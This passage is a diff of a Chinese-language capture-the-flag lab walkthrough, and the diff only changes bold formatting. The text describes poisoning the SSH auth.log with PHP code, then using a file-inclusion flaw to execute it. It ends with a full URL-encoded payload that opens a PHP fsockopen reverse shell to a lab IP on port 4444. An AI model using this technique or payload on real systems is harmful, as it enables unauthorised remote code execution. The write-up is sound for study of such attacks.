@@ -152,7 +152,7 @@ Task Completed
 <p>很直白的提示，可以直接用，没有什么限制</p>
 <p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/c84735a0-d967-42fe-b1f6-964509296361"><img width="1919" height="980" alt="Image" src="https://github.com/user-attachments/assets/c84735a0-d967-42fe-b1f6-964509296361" style="max-width: 100%; height: auto; max-height: 980px;"></a></p>
 <h1>漏洞利用</h1>
-<p>本来我感觉是让我包含服务目录相关的配置文件，但是始终找不到包含的文件，然后尝试包含一些登录凭据文件，也没成功。后面了解到，ssh的log文件在**/var/log/auth.log**，然后由于靶机中文件包含是可以执行php代码，所以可以尝试使用一些php代码作为用户名登录ssh，引发报错之后，包含log文件就会导致代码执行。</p>
+<p>本来我感觉是让我包含服务目录相关的配置文件，但是始终找不到包含的文件，然后尝试包含一些登录凭据文件，也没成功。后面了解到，ssh的log文件在 <strong>/var/log/auth.log</strong>，然后由于靶机中文件包含是可以执行php代码，所以可以尝试使用一些php代码作为用户名登录ssh，引发报错之后，包含log文件就会导致代码执行。</p>
 <p>我是想直接写反向shell进去的，但是里面包含太多的符号，我怎么转义都过不了，后来发现是ssh版本高了，尝试降，想了一下直接用xshell好像就可以，但是直接打反向shell，不知道是太长了还是什么，代码不会完整的进log文件，最后尝试写一句话木马，发现是可以写进去的 <strong></strong></p>
 <p>然后我尝试了非常多的反向shell最后发现只有php的socket能打回来，然后开始提权。<br>
 一定记得编码一下，然后多试错，不然会导致被系统反正很多因素过滤，导致payload出错，这是我的<code class="notranslate">http://192.168.218.217/antibot_image/antibots/info.php?image=/var/log/auth.log&amp;cmd=php+-r+%27%24sock%3dfsockopen(%22192.168.218.148%22%2c4444)%3bexec(%22%2fbin%2fsh+-i+%3c%263+%3e%263+2%3e%263%22)%3b%27</code></p>
